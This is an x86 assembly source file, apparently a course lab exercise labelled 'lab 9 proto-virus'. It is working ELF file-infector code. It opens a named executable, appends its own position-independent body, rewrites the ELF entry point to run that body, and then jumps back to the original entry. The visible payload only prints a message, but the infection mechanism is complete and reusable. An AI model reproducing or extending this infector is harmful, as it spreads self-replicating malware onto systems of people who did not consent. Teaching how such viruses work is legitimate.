%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28

global _start

elf_string db 0x7f,'ELF'

section .bss
file_buffer: resb 4 
fd: resb 4
end_file_off: resb 4
start_elf_add: resb 4
ph_v_add: resb 4
vir_loc: resb 4

section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START

	call get_my_loc				
	sub ecx, (next_i-OutStr)		; make pic
	write 1,ecx,31

open_file:
	call get_my_loc				
	sub ecx, (next_i-FileName)
	mov dword [ebp-4], ecx   ;[ebp-4] = file name

	open [ebp-4], RDWR, 0777
	mov [ebp-8],eax ,		;[ebp-8] = fd
	cmp eax, 0
	jl error

check_elf:
	mov ecx, ebp
	sub ecx, 12
	read [ebp-8], ecx, 4
	cmp eax, 0
	jl error
	cmp dword [ecx] , 0x464c457f
	jnz error

write_virus:
	lseek [ebp-8], 0, SEEK_END
	mov ecx,eax
	mov [ebp - 104], ecx

	call get_my_loc				
	mov edx, ecx

	sub edx, next_i-virus_end		
	sub ecx, (next_i-virus_start) 			
	sub edx, ecx  	; edx = file size
	write [ebp-8], ecx, edx
	cmp eax, -1
	jl error


copy_elf_header_to_stack:
	mov esi, ebp
	lseek [ebp-8], 0, SEEK_SET
	sub esi, 60
	read [ebp-8], esi , 52 
	cmp eax, 0
	jl error
	;write 1 , esi ,4
	cmp eax, 0
	jl error

saving_orig_entry:
	sub esi,4
	mov esi, [ebp - 36]
	mov [ebp-64] ,esi

read_r:
	mov edi, [ebp-ELFHDR_size-8 +PHDR_start]
	lseek [ebp-8], edi, SEEK_SET
	mov edi, ebp
	sub edi, 64
	sub edi, PHDR_size
	read [ebp-8],edi,PHDR_size
v_addr:
	mov edi, [ebp-96+PHDR_vaddr]
	mov esi, ebp
	sub esi, 100
	mov [esi], edi


rewrite_elf_header:
	mov edi , [ebp-100]
	mov esi, [ebp-104]
	add esi, edi

	mov [ebp-60+ENTRY], esi
	mov edi,ebp
	sub edi,60
	lseek [ebp-8] , 0 , SEEK_SET
	cmp eax, 0
	jl error
	write [ebp-8] , edi , ELFHDR_size
	cmp eax, 0
	jl error


prev_entry_jump:
	mov edi, ebp
	sub edi, 64
	lseek [ebp-8] , -4 , SEEK_END
    write [ebp-8], edi, 4
	cmp eax, 0
	jl error
	close [ebp-8]

end: 	
	call get_my_loc				
	sub ecx, next_i - PreviousEntryPoint
	jmp [ecx]

VirusExit:
    exit 0            	; Termination if all is OK and no previous code to jump to
						; (also an example for use of above macros)





virus_start:
call get_my_loc				
sub ecx, (next_i-OutStr)
write 1,ecx,31

call get_my_loc				
sub ecx, next_i - PreviousEntryPoint
jmp [ecx]

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	

error: 
	write 1, Failstr, 12
	jmp VirusExit

FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "Error or not ELF", 10 , 0

PreviousEntryPoint: dd VirusExit
virus_end:

